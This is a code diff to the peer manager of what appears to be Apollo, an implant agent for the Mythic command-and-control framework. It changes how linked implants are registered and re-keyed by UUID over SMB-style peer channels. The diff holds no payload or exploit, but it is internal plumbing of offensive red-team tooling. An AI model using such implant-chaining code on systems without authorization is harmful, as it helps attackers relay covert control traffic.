@@ -9,16 +9,16 @@ using ApolloInterop.Structs.MythicStructs;
 using AI = ApolloInterop;
 namespace Apollo.Management.Peer
 {
-    public class PeerManager : AI.Classes.PeerManager
+    public class PeerManager : AI.Classes.P2P.PeerManager
     {
         public PeerManager(IAgent agent) : base(agent)
         {
 
         }
 
-        public override IPeer AddPeer(PeerInformation connectionInfo)
+        public override AI.Classes.P2P.Peer AddPeer(PeerInformation connectionInfo)
         {
-            IPeer peer = null;
+            AI.Classes.P2P.Peer peer = null;
             switch(connectionInfo.C2Profile.Name.ToUpper())
             {
                 case "SMB":
@@ -34,25 +34,27 @@ namespace Apollo.Management.Peer
             {
                 throw new Exception("Peer not set to an instance of an object.");
             }
-            peer.Start();
             while (!_peers.TryAdd(peer.GetUUID(), peer))
             {
                 System.Threading.Thread.Sleep(100);
             }
+            peer.UUIDNegotiated += (object _, AI.Classes.UUIDEventArgs args) =>
+            {
+                while (!_peers.TryRemove(peer.GetUUID(), out IPeer _))
+                {
+                    System.Threading.Thread.Sleep(100);
+                }
+                while (!_peers.TryAdd(peer.GetMythicUUID(), peer))
+                {
+                    System.Threading.Thread.Sleep(100);
+                }
+            };
+            peer.Start();
             return peer;
         }
 
         public override bool Route(DelegateMessage msg)
         {
-            // This probably isn't the best way to do this.
-            if (msg.MythicUUID != null &&
-                !_peers.ContainsKey(msg.MythicUUID))
-            {
-                lock(_peers)
-                {
-                    _peers[msg.MythicUUID] = _peers[msg.UUID];
-                }
-            }
             if (_peers.ContainsKey(msg.UUID))
             {
                 _peers[msg.UUID].ProcessMessage(msg);
